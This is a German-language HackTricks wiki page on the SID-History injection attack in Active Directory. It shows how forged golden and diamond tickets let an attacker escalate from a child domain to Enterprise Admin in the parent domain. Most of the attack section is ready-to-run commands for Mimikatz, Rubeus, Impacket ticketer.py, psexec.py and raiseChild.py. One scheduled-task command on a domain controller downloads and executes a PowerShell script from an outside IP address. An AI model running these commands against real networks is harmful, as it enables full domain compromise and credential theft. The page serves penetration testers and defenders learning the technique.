# SID-History-Injektion

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud) senden**.

</details>

## SID-History-Injektionsangriff

Der Fokus des **SID-History-Injektionsangriffs** besteht darin, die **Benutzermigration zwischen Domänen** zu unterstützen und gleichzeitig den fortgesetzten Zugriff auf Ressourcen aus der früheren Domäne sicherzustellen. Dies wird erreicht, indem die vorherige Sicherheitskennung (SID) des Benutzers in die SID-History seines neuen Kontos aufgenommen wird. Beachtenswert ist, dass dieser Prozess manipuliert werden kann, um unbefugten Zugriff zu gewähren, indem die SID einer hochprivilegierten Gruppe (wie Enterprise Admins oder Domain Admins) aus der übergeordneten Domäne in die SID-History aufgenommen wird. Diese Ausnutzung gewährt Zugriff auf alle Ressourcen innerhalb der übergeordneten Domäne.

Es gibt zwei Methoden, um diesen Angriff auszuführen: durch die Erstellung eines **Golden Tickets** oder eines **Diamond Tickets**.

Um die SID der Gruppe **"Enterprise Admins"** zu ermitteln, muss zunächst die SID der Stamm-Domäne ermittelt werden. Nach der Identifizierung kann die SID der Enterprise Admins-Gruppe konstruiert werden, indem `-519` an die SID der Stamm-Domäne angehängt wird. Wenn beispielsweise die SID der Stamm-Domäne `S-1-5-21-280534878-1496970234-700767426` lautet, wäre die resultierende SID für die Gruppe "Enterprise Admins" `S-1-5-21-280534878-1496970234-700767426-519`.

Sie können auch die **Domain Admins**-Gruppen verwenden, die mit **512** enden.

Eine andere Möglichkeit, die SID einer Gruppe der anderen Domäne (zum Beispiel "Domain Admins") zu finden, besteht darin:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### Golden Ticket (Mimikatz) mit KRBTGT-AES256

{% code overflow="wrap" %}
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
{% endcode %}

Für weitere Informationen zu Golden Tickets siehe:

{% content-ref url="golden-ticket.md" %}
[golden-ticket.md](golden-ticket.md)
{% endcontent-ref %}

### Diamond Ticket (Rubeus + KRBTGT-AES256)

{% code overflow="wrap" %}
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
{% endcode %}

Für weitere Informationen zu Diamond-Tickets siehe:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

{% code overflow="wrap" %}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
{% endcode %}

Skalieren Sie zu DA oder Root oder Enterprise Admin, indem Sie den KRBTGT-Hash der kompromittierten Domäne verwenden:

{% code overflow="wrap" %}
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
{% endcode %}

Mit den erlangten Berechtigungen aus dem Angriff können Sie beispielsweise einen DCSync-Angriff in der neuen Domäne ausführen:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

### Von Linux aus

#### Manuell mit [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)

{% code overflow="wrap" %}
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
{% endcode %}

#### Automatisch mit [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Dies ist ein Impacket-Skript, das den **automatischen Aufstieg vom Kind- zum Elterndomäne** automatisiert. Das Skript benötigt:

* Ziel-Domänencontroller
* Anmeldeinformationen für einen Administratorbenutzer in der Kinddomäne

Der Ablauf ist wie folgt:

* Ermittelt die SID für die Gruppe "Enterprise-Administratoren" der Elterndomäne
* Ruft den Hash für das KRBTGT-Konto in der Kinddomäne ab
* Erstellt ein Golden Ticket
* Meldet sich in der Elterndomäne an
* Ruft Anmeldeinformationen für das Administrator-Konto in der Elterndomäne ab
* Wenn der Schalter `target-exec` angegeben ist, authentifiziert es sich beim Domänencontroller der Elterndomäne über Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Referenzen
* [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
* [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>
